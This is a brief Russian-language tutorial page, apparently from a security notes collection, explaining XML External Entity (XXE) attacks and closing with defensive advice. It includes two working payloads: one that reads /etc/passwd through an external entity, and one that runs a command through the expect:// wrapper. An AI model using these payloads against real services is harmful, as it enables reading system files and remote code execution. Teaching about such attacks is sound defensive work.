# XML External Entity

Атака на уязвимые парсеры **XML**, где уязвимость следствие багов или пренебрежения настройками парсера. При этом в **XML** попадает пользовательский ввод.

## Механизм

Допустим сервис принимает на вход **XML** объект, например для создания сущности:  

    <creds>
        <user>Ed</user>
        <pass>mypass</pass>
    </creds>

и в случае успеха возвращает его же.  

В этом случае атакующий может дополнить объект полями включения внешних сущностей:  

    <source lang="xml"><?xml version="1.0"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
    <!ENTITY <b>xxe</b> SYSTEM <b>"file:///etc/passwd</b>" >]>
    <creds>
        <user><b>&xxe;</b></user>
        <pass>mypass</pass>
    </creds>

Тогда в ответе сервера придет содержимое файла `/etc/passwd`  

Либо можно вызвать **RCE** (Remote code execution)

    <?xml version="1.0"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "expect://uname" >]>
    <creds>
        <user>&xxe;</user>
        <pass>mypass</pass>
    </creds>

в ответе придет содержимое команды `uname`  

## Защита

* Обновлять используемый **XML**-парсер
* Не пренебрегать его настройкой, поглядывая в документацию
* Стараться использовать максимально глупый **XML**-парсер
* Не использовать **XML**, тк у него слишком много возможностей

[← Назад](../README.md)